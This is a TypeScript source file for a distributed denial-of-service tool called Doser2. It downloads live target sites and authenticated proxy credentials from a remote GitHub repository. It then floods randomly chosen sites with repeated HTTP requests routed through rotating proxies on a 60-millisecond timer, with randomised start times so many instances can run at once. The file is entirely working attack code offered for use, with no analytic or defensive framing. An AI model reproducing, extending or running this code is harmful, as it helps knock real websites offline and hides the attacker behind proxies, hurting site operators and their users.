import axios from 'axios-https-proxy-fix'
import { EventEmitter } from 'events'

interface ProxyData {
  ip: string;
  auth: string;
}

interface SiteData {
  page: string;
}

interface TargetsData {
  sites: Array<SiteData>;
  proxies: Array<ProxyData>;
}

export class Doser2 {
  private working: boolean
  private eventSource: EventEmitter

  private loadedTargetsAndProxies: TargetsData | null = null;
  private targetsAndProxiesInterval?: NodeJS.Timer;
  private tickInterval?: NodeJS.Timer;

  // Attack settings
  private onlyProxy = true;
  private sitesPerTickCount = 10; // How many sites we attack each interval
  private tickingIntervalTime = 60;
  private attacksPerSite = 10; //Attacks per site from different proxies
  private randomStartTimeInterval = 100; // Setting used when you create many instances, additional interval before start

  private requestsPromises: Array<any> = [];

  constructor () {
    this.working = false;
    this.eventSource = new EventEmitter();

    //Initialize data
    this.updateTargetsAndProxies();

    // Update data repeatedly
    this.targetsAndProxiesInterval = setInterval(() => {
      this.updateTargetsAndProxies();
    }, 300000)
  }

  private updateTargetsAndProxies() {
    this.getSitesAndProxies()
      .then(data => {
        this.loadedTargetsAndProxies = data
      })
      .catch(() => console.log('Unable to update data'))
  }

  forceProxy (newVal: boolean) {
    this.onlyProxy = newVal
  }

  async getSitesAndProxies (): Promise<TargetsData | null> {
    try {
      console.log('Loading targets and proxies;')
      const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
      const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })

      if (sitesResponse.status === 200 && proxyResponse.status === 200) {
        const sites: SiteData[] = sitesResponse.data as Array<SiteData>
        const proxies: ProxyData[] = proxyResponse.data as Array<ProxyData>

        console.log('Targets and proxies were loaded;')
        return {
          sites,
          proxies
        }
      } else {
        throw new Error('Bad request, cannot get targets and proxies')
      }
    } catch (e) {
      console.log('Error while loading hosts and proxies: ', e)
    }
    return null
  }

  start () {
    this.working = true;
    setTimeout(() => {
      this.tickInterval = setInterval(() => {
        this.tick()
          .then(() => console.log('Tick done'))
          .catch(e => console.error('Tick with error'));
      }, this.tickingIntervalTime);
    }, Math.random()*this.randomStartTimeInterval);
  }

  stop () {
    this.working = false
  }

  async tick() {
    if(!this.loadedTargetsAndProxies) {
      return;
    }

    const {sites, proxies} = this.loadedTargetsAndProxies;
    if(this.working) {
      for (let i = 0; i < this.sitesPerTickCount; i++) {
        const randomSite = sites[Math.floor(Math.random() * sites.length)]; //Get random site

        // Send few requests to the current target
        for (let j = 0; j < this.attacksPerSite; j++) {
          // Use random proxy for each request
          const randomProxy = proxies[Math.floor(Math.random() * proxies.length)]; //Get random proxy

          const proxyAddressSplit = randomProxy.ip.split(':')
          const proxyIP = proxyAddressSplit[0]
          const proxyPort = parseInt(proxyAddressSplit[1])
          const proxyAuthSplit = randomProxy.auth.split(':')
          const proxyUsername = proxyAuthSplit[0]
          const proxyPassword = proxyAuthSplit[1]

          const promise = axios.get(
            randomSite.page,
            {
              timeout: 5000,
              validateStatus: () => true,
              proxy: {
                host: proxyIP,
                port: proxyPort,
                auth: {
                  username: proxyUsername,
                  password: proxyPassword
                }
              }
            }
          );

          // Show some stats about it
          promise
            .then(result => {
              console.log(`Attack: ${randomSite.page} | ${result.status}`);
              if (result.status === 407) {
                console.log('Proxy requires auth: ', randomProxy)
              }
            }).catch((e) => {
              console.log(`Fail: ${randomSite.page} | ${e.code}`);
            })

          this.requestsPromises.push(promise);
        }
      }

      // Execute all requests
      await Promise.all(this.requestsPromises);

      console.log('Request count: ', this.requestsPromises.length);

      this.requestsPromises = []; // Clear
    }
  }
}
